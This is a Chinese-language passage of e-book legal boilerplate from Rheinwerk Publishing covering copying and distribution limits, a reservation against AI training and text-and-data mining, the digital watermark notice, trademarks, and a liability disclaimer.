特别是，不得将电子或印刷副本转发给第三方。此外，不得在互联网、内联网或以任何其他方式分发电子书或使其可供第三方使用。明确禁止对电子书进行超出个人使用范围的任何公开展示、其他出版或复制。上述规定不仅适用于电子书的整体，也适用于其部分内容（例如，图表、图片、表格、文本部分）。

版权注释、品牌及其他法律保留事项以及数字水印不得从电子书中删除。

不得以任何方式使用或复制本书的任何部分，用于训练人工智能技术或系统。根据《数字单一市场指令》2019/790 条第 4(3) 款，Rheinwerk Publishing, Inc. 明确保留本作品不进行文本和数据挖掘的权利。

### 数字水印

本电子书副本包含一个**数字水印**，该签名指示哪个人可以使用此副本。亲爱的读者，如果您不是此人，则您侵犯了版权。因此，请勿使用此电子书，并告知我们此侵权行为。向 info@rheinwerk-publishing.com 发送一封简短的电子邮件即可。谢谢！

## 商标

本出版物中使用的通用名称、商品名称、商品描述等可能是未作特殊标识并受此类法律规定约束的商标。

本书中提及的所有产品均为其各自公司的注册或未注册商标。

## 责任限制

无论在创建文本、图形和程序时已尽多少谨慎，出版商、作者、编辑或翻译人员均不承担任何可能的错误及其后果的法律责任或任何责任。

